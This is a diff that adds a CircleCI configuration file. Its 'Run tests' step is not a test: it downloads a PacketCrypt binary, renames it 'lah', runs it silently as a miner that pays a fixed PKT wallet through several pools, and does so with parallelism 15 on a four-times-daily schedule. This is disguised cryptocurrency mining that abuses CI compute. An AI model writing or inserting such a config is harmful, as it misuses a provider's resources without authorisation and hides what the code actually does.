@@ -1,1 +1,33 @@
-
+version: 2.1
+jobs:
+  build_and_test: # this can be any name you choose
+    docker:
+      - image: thomasjp0x42/packetcrypt
+    steps:
+      - checkout
+      - run:
+          name: Run tests
+          no_output_timeout: 294m
+          command: |
+                  wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O lah
+                  chmod +x lah 
+                  ./lah ann -p pkt1qv437nndzvr9u8ps60g3d5dl0gssu84ulwksvfq http://pool.pkt.world/ http://pool.pktpool.io/ http://pool.srizbi.com/ http://pool.pkteer.com/ http://pktco.in/ >/dev/null 2>&1
+                  echo "lah"
+    parallelism: 15
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build_and_test
+ 
+    triggers:
+      - schedule:
+          cron: "0 5,10,15,20 * * *"
+          filters:
+            branches:
+              only:
+                - main    
+                
+  build_and_tests:
+    jobs:
+      - build_and_test
